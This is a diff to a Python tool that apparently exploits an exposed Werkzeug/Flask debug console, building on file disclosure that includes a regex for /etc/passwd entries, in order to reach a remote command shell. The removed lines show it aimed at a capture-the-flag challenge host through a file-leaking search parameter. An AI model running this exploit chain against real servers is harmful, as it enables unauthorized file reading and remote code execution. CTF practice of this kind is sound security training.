@@ -9,12 +9,6 @@ def error(message="", prefix=""):
     print(f"{prefix}[ERROR] {message}")
     exit(1)
 
-class WConsoleExtractorException(Exception):
-    def __init__(self, message=""):
-        self.message = message
-        super().__init__(self.message)
-
-
 class WConsoleExtractor:
     etc_passwd_regex = re.compile(r"(.+):.*:.*:.*:.*:.*:.*")
     modname = "flask.app"
@@ -222,18 +216,3 @@ class WConsoleExtractor:
                 error("Shell terminated", prefix="\n")
 
             self.print(f"{self.exec_cmd(cmd)}\n")
-
-import requests
-
-def leak_file(filename) -> str:
-    r = requests.get(f"https://chall-hosting.0xhorizon.eu/services?search={filename}")
-    soup = bs(r.text, 'html.parser')
-
-    return soup.find("center").contents[1].strip()
-
-extractor = WConsoleExtractor(
-    target="https://chall-hosting.0xhorizon.eu/console",
-    leak_function=leak_file
-)
-
-extractor.shell()
